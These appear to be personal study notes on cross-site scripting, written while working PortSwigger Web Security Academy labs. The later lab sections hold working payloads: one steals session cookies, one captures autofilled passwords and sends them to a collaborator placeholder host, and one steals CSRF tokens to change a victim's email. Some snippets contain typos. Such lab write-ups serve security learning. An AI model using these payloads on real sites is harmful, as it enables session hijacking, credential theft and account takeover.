content: https://portswigger.net/web-security/cross-site-scripting

cheat sheet https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 

There are three main types of XSS attacks. These are:

- [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting), where the malicious script comes from the current HTTP request.
- [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting), where the malicious script comes from the website's database.
- [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting), where the vulnerability exists in client-side code rather than server-side code.

## **Reflected XSS**

### **How to find and test for reflected XSS vulnerabilities**

https://portswigger.net/web-security/cross-site-scripting/reflected#:~:text=How%20to%20find%20and%20test%20for%20reflected%20XSS%20vulnerabilities

> **Core Concept:** An application receives data in an HTTP request and immediately includes (reflects) that data inside the immediate HTTP response in an unsafe, unsanitized manner, leading to arbitrary JavaScript execution in the victim's browser.
> 

### Points to Memorize

- **The Mechanism:** The payload is **not stored** on the server. It relies on a victim clicking a maliciously crafted link or submitting a specific form.
- **The Flow:** Attacker crafts Link $\rightarrow$ Victim clicks Link $\rightarrow$ Request goes to vulnerable Server $\rightarrow$ Server reflects script into Response $\rightarrow$ Victim's Browser executes script.
- **The Impact:** Happens entirely within the context of the victim's session. Attackers can steal session tokens (cookies), capture keystrokes, or perform unauthorized actions on behalf of the user.

### Manual Testing Methodology (The 5-Step Process)

When hunting for Reflected XSS manually during an exam or bug bounty engagement, follow this structured pipeline:

### 1. Test Every Entry Point

Do not limit testing to just standard search bars. Fuzz all potential inputs separately:

- URL Query parameters (`?q=`, `?id=`)
- POST body data (Form parameters, JSON keys)
- URL file paths
- HTTP Headers (e.g., `User-Agent`, `Referer`—though harder to exploit, they can trigger reflections).

### 2. Submit Alphanumeric Canary Values

- Inject a unique, random alphanumeric string (around 8 characters, e.g., `xssz1234`) into the parameter.
- **Why?** It easily bypasses basic input filters and makes it simple to search for in the response without getting false positives.
- *Tooling Tip:* Use Burp Intruder's **Grep Payloads** feature to automatically flag responses where your unique canary string appears.

### 3. Determine the Reflection Context

When you find your canary string in the response, look at its surrounding environment. This dictates your final payload:

- **HTML Text:** Between tags (e.g., `<div>xssz1234</div>`).
- **HTML Attribute:** Inside a tag attribute (e.g., `<input type="text" value="xssz1234">`).
- **JavaScript Variable:** Inside an existing script block (e.g., `let search = 'xssz1234';`).

### 4. Test a Candidate Payload

- Send the active request to **Burp Repeater**.
- Insert a target-specific payload right next to your canary string (e.g., `xssz1234<script>alert(1)</script>`).
- Use Burp's search bar in the Response tab to jump straight to your canary and check if your payload tags were stripped, URL-encoded, or reflected perfectly.

### 5. Verify in a Real Browser

- If the raw code in Burp Repeater looks unescaped, right-click the request and select **"Copy URL"** or **"Show response in browser"**.
- Paste it into your testing browser (like Chromium in Kali).
- A successful execution typically fires a harmless popup using `alert(document.domain)`.

### Quick Reference Checklist

| **Reflection Context** | **Base Breaking-Out Strategy** | **Candidate Payload Example** |
| --- | --- | --- |
| **HTML Text** | Direct tag injection | `<script>alert(1)</script>`
`<img src=x onerror=alert(1)>` |
| **HTML Attribute** | Break out of quotes and close tag element | `" autofocus onfocus=alert(1)//`
`"><script>alert(1)</script>` |
| **JavaScript String** | Break out of the string literal and statement | `';alert(1);//`
`'-alert(1)-'` |

### **Lab: Reflected XSS into HTML context with nothing encoded**

https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded 

- Copy and paste the following into the search box: `<script>alert(1)</script>`
- Click "Search".

## Stored XSS

https://portswigger.net/web-security/cross-site-scripting/exploiting#:~:text=Exploiting%20cross%2Dsite%20scripting%20vulnerabilities

### What is Stored XSS?

**Stored Cross-Site Scripting** (also known as persistent or second-order XSS) occurs when a web application takes untrusted data from an entry point, stores it permanently (e.g., in a database), and later embeds that data into HTTP responses sent to other users without proper sanitization.

When a victim views the affected page, the malicious script executes automatically within their browser under the context of their session.

---

### Key Challenges in Finding and Testing Stored XSS

Testing for stored XSS manually is highly challenging because data from **any entry point** can theoretically appear in **any exit point**.

- **Entry Points:** Can include URL parameters, message bodies, file paths, HTTP headers, or out-of-band sources (like emails or third-party API feeds).
- **Exit Points:** Any HTTP response returned to any user.
- **The Hurdles:** Testing every single permutation is often impractical. Furthermore, stored data can be volatile and quickly overwritten by other application activity (like a "recent searches" widget).

---

### The Testing Methodology

1. **Automate when possible:** Utilize web vulnerability scanners (like Burp Suite) to catch low-hanging fruit.
2. **Map entry to exit points:** Systematically submit a unique, identifiable value into data entry points and monitor the application's responses across different pages to see where that value appears.
3. **Verify persistence:** Ensure the data is actually being stored long-term across separate requests, rather than just reflected in the immediate response.
4. **Context-based payload testing:** Once a data link is confirmed, analyze the HTML context where the data is rendered and test specific XSS payloads tailored to bypass that specific context (similar to testing for reflected XSS).

### **Lab: Stored XSS into HTML context with nothing encoded**

https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded 

in the comment section, I added this script

```bash
<script>print()</script>
```

and when i return back to the comments section, it popup this window

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/l1.png)

So there is a comment section under each blog, and when we inject a malicious javascript in the comments, it will popup to everyone visiting this blog

```bash
https://0ae9001d042cb14480a20dcc003400cb.web-security-academy.net/post?postId=2
```

I also tried this payload, where a popup window will show if you click on the comment

```jsx
<xss onclick="alert('stored xss')" style=display:block>test stored xss</xss>
```

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/l2.png)

and when i checked the source code of the blog, I found my payload was injected

```jsx
<p>
<xss onclick="alert('stroed xxs')" style=display:block> test stored xss</xx>
</p>
```

check the cheat sheet→ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 

there is a lot of different payload to try

## **DOM-based XSS**

content: https://portswigger.net/web-security/cross-site-scripting/dom-based 

DOM-based XSS occurs when a application's client-side JavaScript takes data from an attacker-controllable **source** and passes it unsafely to a **sink** that supports dynamic code execution.

```jsx
[ Attacker-Controllable Source ] ---> ( JavaScript Processing ) ---> [ Execution Sink ]
       (e.g., window.location)                                        (e.g., innerHTML)
```

Unlike Reflected or Stored XSS, where the malicious payload is embedded in the server's HTTP response, DOM XSS happens entirely within the browser's Document Object Model (DOM) during runtime.

### Key Components:

- **Sources:** The entry point where user-controlled data enters the application. The most common source is the URL, accessed via the `window.location` object (such as query parameters or URL fragments).
    
    > In JavaScript, **`window.location.search`** returns the query string portion of the current URL, including the leading question mark (`?`). For example, if the browser is currently at `https://example.com`, `window.location.search` will evaluate exactly to the string `"?product=shoes&size=9"`
    > 
- **Sinks:** The execution point where the untrusted data is rendered or executed. If data reaches a sink without proper sanitization, arbitrary JavaScript executes, allowing the attacker to hijack user sessions or accounts.

### Methodology: How to Test for DOM XSS

Testing for DOM XSS requires analyzing client-side execution using a browser's Developer Tools (like Chrome DevTools). The process differs based on the type of sink involved.

**Strategy A: Testing HTML Sinks (e.g., `innerHTML`)**

HTML sinks insert data directly into the page layout. Because this happens dynamically via JavaScript, using the standard **"View Source"** option will not work.

1. **Inject a Marker:** Place a unique, random alphanumeric string into the source (e.g., append `?teststring123` to the URL).
2. **Inspect the DOM:** Open DevTools and use `Ctrl+F` (or `Cmd+F`) to search the active DOM for your marker string.
3. **Analyze the Context:** Identify exactly where the string lands (e.g., inside an HTML tag, inside an attribute like `value=""`, etc.).
4. **Refine the Payload:** Attempt to break out of the context. For example, if your string is inside double quotes, attempt to inject a double quote (`"`) to close the attribute and inject an event handler (like `onload` or `onerror`).

> ⚠️ **Browser Encoding Caveat:** Modern browsers like Chrome, Firefox, and Safari automatically URL-encode `location.search` and `location.hash`. If the data is encoded before the sink processes it, the XSS attack will likely fail. Older browsers (like IE11) do not encode these sources.
> 

---

**Strategy B: Testing JavaScript Execution Sinks (e.g., `eval()`)**

Execution sinks run code directly, meaning your input might never actually appear visually in the HTML DOM.

1. **Search the Codebase:** Open DevTools and use `Ctrl+Shift+F` (or `Cmd+Alt+F`) to search all loaded JavaScript files for references to the source (e.g., searching for `location`).
2. **Trace the Taint Flow:** Follow the data. JavaScript often assigns the source to various variables. You must map how these variables pass data down the line.
3. **Set Breakpoints:** Use the JavaScript debugger to set breakpoints where the source data is manipulated.
4. **Inspect the Sink:** Hover over variables right before they hit the suspected sink to view their real-time values, then craft an input that forces arbitrary code execution.

### **Lab: DOM XSS in `document.write` sink using source `location.search`**

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.
        

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/l3.png)

My search is inserting into `img src` attribute

```html
/?search=none
```

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/l4.png)

note we closed the img tag with `“>` and injected our DOM code

```html
/?search=none"><svg onload=alert(1)>
```

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/l5.png)

### Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/l6.png)

This is the vulnerable script that the website use it to load and write available stores dropdown list

```jsx
var stores = ["London","Paris","Milan"];
// 1. Look at the URL and find the value of the 'storeId' query parameter
var store = (new URLSearchParams(window.location.search)).get('storeId');

// 2. Open a dropdown menu (<select>) in the HTML
document.write('<select name="storeId">');

// 3. If a 'storeId' parameter was found in the URL, create a pre-selected option for it
if(store) {
    document.write('<option selected>'+store+'</option>');
}

// 4. Loop through the default stores array and add them as normal options
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue; // Skip if it's already the selected one
    }
    document.write('<option>'+stores[i]+'</option>');
}

// 5. Close the dropdown menu
document.write('</select>');
```

The `store` variable comes directly from the URL (`window.location.search`), which is entirely controlled by the user. The application takes this input and uses `document.write` to feed it directly into the page's HTML without checking or cleaning (encoding) it first.

```jsx
/product?productId=1&storeId=Noting
```

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/l7.png)

To understand DOM XSS, you need to understand two concepts: **Sinks** and **Sources**.

1. **The Source:** A JavaScript property that an attacker can control. In this case, the source is `window.location.search` (the query parameters in the URL).
2. **The Sink:** A JavaScript function or DOM object that can execute code or render HTML if given malicious input. In this case, the sink is `document.write()`.

**DOM XSS occurs when an application takes data from a Source and passes it into a Sink without proper validation or escaping.** Because this processing happens entirely inside the victim's browser via JavaScript, the vulnerability exists in the Client-Side Document Object Model (DOM).

Normally, if a user visits the URL with `&storeId=Paris`, the HTML rendered by `document.write` looks safe:

```html
<select name="storeId">
    <option selected>Paris</option>
...
```

However, because the code blindly concatenates strings, an attacker can input HTML tags into the URL instead of a normal store name. To execute code (like the `alert()` function r), the attacker must **break out** of the tags that enclose their input.

```html
/product?productId=1&storeId=test</select><svg onload=alert(1)>
```

I closed the select tag because the option tag will be closed automatically since our input is inserted into the drop down list

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/l8.png)

or we can test this paylaod, where the script tag is inside the option tag

```html
/product?productId=1&storeId=<script>alert(1)</script></option>
```

This result in:

```html
<select name="storeId"><option selected=""><script>alert(1)</script></option></select>
```

### **Lab: DOM XSS in `innerHTML` sink using source `location.search`**

The `innerHTML` sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire. This means you will need to use alternative elements like `img` or `iframe`. Event handlers such as `onload` and `onerror` can be used in conjunction with these elements.

**Lab**: This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/l9.png)

```jsx
function doSearchQuery(query) {
    // 3. The 'query' string is directly inserted into the HTML inside the 'searchMessage' element
    document.getElementById('searchMessage').innerHTML = query;
}

// 1. Grab the value of the 'search' parameter from the URL
var query = (new URLSearchParams(window.location.search)).get('search');

// 2. If the user searched for something, pass that value to the function
if(query) {
    doSearchQuery(query);
}
```

- **The Source:** `window.location.search` (the text after the `?search=` in the URL).
- **The Sink:** `innerHTML` (specifically on the `searchMessage` element).
    
    > In JavaScript, **the `innerHTML` property gets or sets the HTML markup contained inside an element**. It is one of the most common ways to dynamically view or modify web page content.
    > 

```jsx
<span id="searchMessage">bluhh</span>
```

```jsx
t/?search=</span><img src="1" onerror=alert(1)>
```

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/l10.png)

```jsx
<h1><span>0 search results for '</span><span id="searchMessage"><img src="1" onerror="alert(1)"></span><span>'</span></h1>
```

### Real-World Impact (What the payload actually does)

While labs use `alert()` to prove a vulnerability exists, a real attacker will replace `alert()` with a silent payload designed to cause maximum damage:

- **Session Hijacking:** The script reads `document.cookie` and sends the victim's session tokens to a server controlled by the attacker. The attacker can then clone those cookies to log into the victim's account from anywhere in the world.
- **The Hybrid XSS/CSRF Attack:** As discussed earlier, the script can secretly fetch the victim's CSRF token, change their account email to the attacker's email, and trigger a password reset—completely locking the victim out.
- **Data Exfiltration:** If the website deals with sensitive data (like a medical portal or a banking app), the script can scrape financial details, personally identifiable information (PII), or private messages off the screen and send them to the attacker.
- **Defacement / Phishing Overlay:** The script can alter the appearance of the page, injecting a fake login box over the real site to trick the user into re-entering their password or credit card details.

## Exploiting XSS Labs

https://portswigger.net/web-security/cross-site-scripting/exploiting

### **Exploiting cross-site scripting to steal cookies**

exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, then manually inject the cookies into the browser and impersonate the victim. 

In practice, this approach has some significant limitations:

- The victim might not be logged in.
- Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
- Sessions might be locked to additional factors like the user's IP address.
- The session might time out before you're able to hijack it.

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim. 

- Note we will perform the Alternative solution without using burp collaborate:
    
    > Alternatively, you could adapt the attack to make the victim post their session cookie within a blog comment by exploiting the XSS to perform CSRF. However, this is far less subtle because it exposes the cookie publicly, and also discloses evidence that the attack was performed.
    > 

when we sent a comment, this was included in the POST  request

```jsx
csrf=u8WG0wFgJdodMY4HtBya0Q6tQUp36VRE&postId=9&comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&name=test&email=john.doe%40gmail.com&website=
```

the csrf ensure that the request originates from the same location as the place where the form was generated and without that, we are not able to post a comment on behalf of the victim, and this token is appended automatically with each form post

```jsx
  <input required type="hidden" name="csrf" value="TSCQiqc4vWmbPDzDaQKeVuO63Q2j4T0h">
```

but since we can run arbitrary javascript, it is easy to access the csrf token by fetching the name of the attribute on the source code which is `crsf` . In the developer tools, open terminal and type:

```jsx
document.getElementsByName('csrf')[0].value; 
"TSCQiqc4vWmbPDzDaQKeVuO63Q2j4T0h" 
```

Here is the javascript code that we gonna use to steel victim session. 

```jsx
<script> 
window.addEventListener('DOMContentLoaded', function(){

// fetch the victim crsf token:
var token = document.getElementsByName('csrf')[0].value; 
var data = new FormData();

data.append('csrf', token);
data.append('postId', 8);  // change the post id to the blog you are injecting on
data.append('comment', document.cookie);  // here we will attach the victim session in the post request and publish it
data.append('name', 'victim');
data.append('email', 'bluh@gmail.com');
data.append('website','http://blu.com');

fetch('/post/comment', {
			method: 'POST',
			mode: 'no-cors',
			body: data
});
});
</script> 

```

Note that we added the second line code to make sure that the page was completely loaded and the csrf is attached. After injecting the script, the lab will simulate a victim visiting the blog and view all the comment, and because this is a **stored XSS** the victim dose not need to click anything! Just by navigating to the blog post to read the comments, the script automatically executes in their browser.

This is was the request: (after URL decode)

```jsx
csrf=q7MpZ2xYy8VkJGSIKXdIGJoYdc2rB7hB&postId=6&comment=<script><our malicious js></script>&name=test2&email=test@example.com&website=
```

and this is the POST request that was made after the victim visited the blog and viewed the comments and his session will be hijacked

```jsx
POST /post/comment HTTP/2
Host: 0a10003d03d1840a800d0deb006c004d.web-security-academy.net
Cookie: session=BGcZCK5G6fk0kAc2YAIn3lCSXCAayoR8
Content-Length: 706
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary77aBNsrBHA2NG5Lu
...

------WebKitFormBoundary77aBNsrBHA2NG5Lu
Content-Disposition: form-data; name="csrf"

q7MpZ2xYy8VkJGSIKXdIGJoYdc2rB7hB
------WebKitFormBoundary77aBNsrBHA2NG5Lu
Content-Disposition: form-data; name="postId"

6
------WebKitFormBoundary77aBNsrBHA2NG5Lu
Content-Disposition: form-data; name="comment"

session=BGcZCK5G6fk0kAc2YAIn3lCSXCAayoR8
------WebKitFormBoundary77aBNsrBHA2NG5Lu
Content-Disposition: form-data; name="name"

victim
------WebKitFormBoundary77aBNsrBHA2NG5Lu
Content-Disposition: form-data; name="email"

bluh@gmail.com
------WebKitFormBoundary77aBNsrBHA2NG5Lu
Content-Disposition: form-data; name="website"

http://blu.com
------WebKitFormBoundary77aBNsrBHA2NG5Lu--

```

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/l11.png)

### **Exploiting cross-site scripting to capture passwords**

Lab URL: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords ****

Create a password input that reads the auto-filled password manager and sending it to your domain

the limitation:

- it only works on users who have a password manager that performs password auto-fill. (Of course, if a user doesn't have a password saved you can still attempt to obtain their password through an on-site phishing attack, but it's not quite the same.)

Lab:  This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account. 

The solution with BurpCollaporater: 

- same steps as in the solution section

After filling the payload in the comment section

```jsx
<script>
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
</script>
```

The comment section will look like this:
 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/l12.png)

!Source: https://medium.com/@marduk.i.am/exploiting-cross-site-scripting-to-capture-passwords-b2cda84698b0 


Two empty fields for the username and the password, and the victim suppose to fill these fields and without the submit button, the credentials will already send because of the `onchange` event, after filling it, a POST request will sent to your domain containing victims creds 

- **Note that this is not about phishing attack simulation, but rather taking advantage of the autofill password feature on the victim’s browser**

---

**Second Solution** is similar to the previous lab, were we gonna post the victims creds into the comment section

```jsx

<input type="text" name="username">
<input type="password" name="password" onchange="hex()">

<script>
	fuction hex(){
		var token = document.getElementByName('csrf')[0].value;
		var username = document.getElementByName('username')[0].value;
		var password = document.getElementByName('password')[0].value;

        // fill the comment form
		var data = new FormDate();
		data.append('csrf', token);
		data.append('postId', 8);
		data.append('comment', `${username}:${password}`);
		data.append('name', 'victim');
		data.append('email', 'victim@gamil.com');
		data.append('website', 'http://bluh.com');

		// send a POST with the victim creds on the comment section
		fetch('/post/comment', {
			method: 'POST',
			body: data
		})

	}

</script>
```

once we inject this js, you will see two fields under the test name

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/l13.png)

and once the victim visits the blog, the auto-fill feature will automatically fill the fields with his credentials and it send a POST request in the comment section containg his username:password

### **Exploiting cross-site scripting to bypass CSRF protections**

Lab url: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf 

Traditional CSRF is a **one-way** attack; an attacker can force a victim's browser to send a request (like changing a setting) but cannot see the website's response. Because of this, websites use unique **CSRF tokens** to validate requests.

However, XSS turns this into a **two-way** attack. Because XSS allows an attacker to execute arbitrary JavaScript directly inside the victim's browser, the attacker can both send requests *and* read the responses.

**How the Attack Works**

1. **The Infiltration:** The attacker leverages an XSS vulnerability to execute malicious JavaScript in the victim's session.
2. **The Token Theft:** The script reads the website's HTML response to find and steal the victim's unique CSRF token.
3. **The Unauthorized Action:** Using the stolen token, the script sends a valid, authenticated request to change the victim's account details (such as their email address) without requiring their password.
4. **The Takeover:** Once the email is changed to one the attacker controls, they trigger a standard password reset to permanently hijack the account.

> **In short:** While anti-CSRF defenses normally block unauthorized requests, XSS allows attackers to steal the "keys" (CSRF tokens) needed to make those requests look entirely legitimate.
> 

**Lab:**This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments. 

when we try to update our email, there is a hidden parameter appended to the POST request

```bash
POST /my-account/change-email HTTP/2
Host: 0a2f00fa049b1188807d03ae00970087.web-security-academy.net
Cookie: session=kdGso5G6XlTaXX7Uq58H30vI5qcsrwXd
...

email=test%40example.com&csrf=N0r16afU9OvtaSX3cTxYHDdHdteE6JGQ
```

In source code:

```bash
</label>
  <input required type="email" name="email" value="">
  <input required type="hidden" name="csrf" value="N0r16afU9OvtaSX3cTxYHDdHdteE6JGQ">
  <button class='button' type='submit'> Update email </button>
```

Inject this payload into the comment section

```html

<script>
	// first request that send a get request to the victims browser to extract the csrf token and the session
	var req = new XMLHttpRequest();
	req.onload = HandleResponse;
	req.open('get', '/my-account', true);
	req.send();

	function HandleResponse(){

		// exract the csrf token from the reponse text using RegEx 
		var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
		// second request that change the victim's email
		var changeReq = new XMLHttpRequest();

		changeReq.open('post', '/my-account/change-email', true);
		changeReq.send('email=haker@example.com&csrf='+token+'')

	};

</script>
```

when I viewd the comments section, a POST request was made containg the changed email and my csrf token 

```bash
POST /my-account/change-email HTTP/2
Host: 0a2f00fa049b1188807d03ae00970087.web-security-academy.net
Cookie: session=fOxhKK6fUoduEWpzkNOa5AIIEwu3wzbC
Content-Length: 60

email=bluhgg@gmail.com&csrf=aGOpTSahxPVeaRrTm3ly0NJdB3d8Ia8Q
```

## Other XSS Labs

https://yogsec.github.io/xss-labs/